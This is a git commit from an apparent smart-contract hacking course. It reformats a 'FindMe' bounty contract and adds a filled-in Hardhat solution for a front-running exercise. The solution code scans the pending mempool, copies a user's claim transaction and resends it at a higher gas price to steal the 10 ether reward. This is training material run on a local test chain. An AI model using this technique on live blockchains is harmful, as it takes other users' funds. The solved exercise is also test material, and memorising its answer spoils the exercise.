ae3b257a5342b2a819918798f03f64f31cbe733c
firatstory.eth <talefirat@gmail.com>
2024-04-28 17:43:27 +0200

    add frontrunning-1 hardhat tests

--- src/frontrunning-1/FindMe.sol
+++ src/frontrunning-1/FindMe.sol
@@ -8,25 +8,20 @@ pragma solidity ^0.8.13;
  * @author JohnnyTime (https://smartcontractshacking.com)
  */
 contract FindMe {
-    bytes32 public constant hash =
-        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;
+    bytes32 public constant hash = 0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;
 
     constructor() payable {}
 
     function claim(string memory solution) public {
-        require(
-            hash == keccak256(abi.encodePacked(solution)),
-            "Incorrect response"
-        );
+        require(hash == keccak256(abi.encodePacked(solution)), "Incorrect response");
         require(address(this).balance >= 10 ether, "Not enough ether");
-        (bool sent, ) = msg.sender.call{value: 10 ether}("");
+        (bool sent,) = msg.sender.call{value: 10 ether}("");
 
         require(sent, "Failed to send Ether");
     }
 
     function funnyFunction() public pure returns (string memory) {
-        return
-            "I am a funny function, I am not used for anything, I am just here to make you laugh";
+        return "I am a funny function, I am not used for anything, I am just here to make you laugh";
     }
 
     function complicateFunction() public pure returns (string memory) {
@@ -36,8 +31,7 @@ contract FindMe {
             }
         }
 
-        return
-            "I am a complicate function, I am not used for anything, I am just here to make you cry";
+        return "I am a complicate function, I am not used for anything, I am just here to make you cry";
     }
 
     function getBalance() public view returns (uint256) {
--- test/frontrunning-1/tests.ts
+++ test/frontrunning-1/tests.ts
@@ -1,53 +1,63 @@
-import { ethers } from 'hardhat';
-import { expect } from 'chai';
-import { BigNumber } from '@ethersproject/bignumber';
-import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
-import { FindMe } from '../../typechain-types';
+import {ethers, network} from 'hardhat';
+import {expect} from 'chai';
+import {BigNumber} from '@ethersproject/bignumber';
+import {SignerWithAddress} from '@nomicfoundation/hardhat-ethers/signers';
+import {FindMe} from '../../typechain-types';
 
-const { provider, deployContract, getSigners, parseEther, parseUnits } = ethers;
+const {provider, deployContract, getSigners, parseEther, parseUnits} = ethers;
 
 /**
  * @dev run "npx hardhat test test/frontrunning-1/tests.ts"
  */
 describe('Frontrunning Attack Exercise 1', function () {
-	let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;
+  let deployer: SignerWithAddress, user: SignerWithAddress, attacker: SignerWithAddress;
 
-	let attackerInitialBalance: bigint;
+  let attackerInitialBalance: bigint;
 
-	let findMe: FindMe;
+  let findMe: FindMe;
 
-	before(async function () {
-		/** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
+  before(async function () {
+    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
-		[deployer, user, attacker] = await getSigners();
-		attackerInitialBalance = await provider.getBalance(attacker.address);
+    [deployer, user, attacker] = await getSigners();
+    attackerInitialBalance = await provider.getBalance(attacker.address);
 
-		findMe = await deployContract('FindMe', {
-			value: parseEther('10'),
-		});
-		await provider.send('evm_mine', []);
+    findMe = await deployContract('FindMe', {
+      value: parseEther('10'),
+    });
+    await provider.send('evm_mine', []);
 
-		const obfuscatedString = atob('RXRoZXJldW0=');
-		await findMe.connect(user).claim(obfuscatedString);
-	});
+    const obfuscatedString = atob('RXRoZXJldW0=');
+    await findMe.connect(user).claim(obfuscatedString);
+  });
 
-	it('Exploit', async function () {
-		/** CODE YOUR SOLUTION HERE */
+  it('Exploit', async function () {
+    /** CODE YOUR SOLUTION HERE */
 
     // TODO: Get all the tx's in the mempool
+    const {transactions} = await network.provider.send('eth_getBlockByNumber', ['pending', true]);
+    const findMeAddress = await findMe.getAddress();
 
     // TODO: Find the tx that is sending eth to the FindMe contract
-    
+    const txClaim = transactions.find((tx: any) => {
+      return tx.to.toLowerCase() === findMeAddress.toLowerCase();
+    });
+
     // TODO: Send the same tx with more gas
-    
-	});
+    await attacker.sendTransaction({
+      to: findMeAddress,
+      data: txClaim.input,
+      gasPrice: txClaim.gasPrice + 1,
+      gasLimit: txClaim.gas,
+    });
+  });
 
-	after(async function () {
-		// Mine all the transactions
-		await provider.send('evm_mine', []);
+  after(async function () {
+    // Mine all the transactions
+    await provider.send('evm_mine', []);
 
-		// Check if the attacker have in his balance at leat 9.9 more eth than what he had before
-		const attackerBalance = await provider.getBalance(attacker.address);
-		expect(attackerBalance).is.gt(attackerInitialBalance + parseEther('9.9'));
-	});
+    // Check if the attacker have in his balance at leat 9.9 more eth than what he had before
+    const attackerBalance = await provider.getBalance(attacker.address);
+    expect(attackerBalance).is.gt(attackerInitialBalance + parseEther('9.9'));
+  });
 });
